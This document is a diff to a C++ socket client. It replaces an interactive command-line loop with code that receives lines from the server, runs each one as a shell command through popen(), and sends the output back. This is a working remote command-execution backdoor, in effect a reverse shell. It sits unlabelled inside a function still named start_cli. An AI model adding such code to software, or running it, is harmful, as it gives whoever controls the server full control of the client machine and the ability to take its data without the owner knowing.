@@ -6,7 +6,10 @@
 #include <errno.h>
 #include <stdlib.h>
 #include <iostream>
-#include <string>
+#include <cstdio>
+#include <memory>
+#include <stdexcept>
+#include <array>
 
 #include "SocketUtils.h"
 
@@ -67,6 +70,22 @@ void print_server_connection_info(int fd)
               << std::endl;
 }
 
+std::string exec_command(const char *cmd)
+{
+    std::array<char, 128> buffer;
+    std::string result;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if (!pipe)
+    {
+        throw std::runtime_error("popen() failed!");
+    }
+    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr)
+    {
+        result += buffer.data();
+    }
+    return result;
+}
+
 void start_cli(int fd)
 {
     std::string input;
@@ -74,14 +93,26 @@ void start_cli(int fd)
 
     while (true)
     {
-        getline(std::cin, input);
-        input = input.append("\n");
-        SocketUtils::Writen(fd, input.c_str(), input.length());
-        if (SocketUtils::Readline(fd, receive_line, MAXLINE) == 0) {
-            std::cout << "Failed to read response from server" << std::endl;
-            exit(1);
+        if (SocketUtils::Readall(fd, receive_line, MAXLINE) == 0)
+        {
+            std::cout << "Connection closed!" << std::endl;
+            close(fd);
+            exit(0);
         }
 
-        std::cout << "Received from server: " << receive_line << std::endl;
+        std::string result = exec_command(receive_line);
+
+        SocketUtils::Writen(fd, result.c_str(), result.length());
+
+        if (SocketUtils::Readall(fd, receive_line, MAXLINE) == 0)
+        {
+            std::cout << "Connection closed!" << std::endl;
+            close(fd);
+            exit(0);
+        }
+
+        std::string received_str = std::string(receive_line);
+        std::cout << "Received from server (reversed): " << std::string(received_str.rbegin(), received_str.rend()) << std::endl<< std::endl<< std::endl<< std::endl;
+
     }
 }
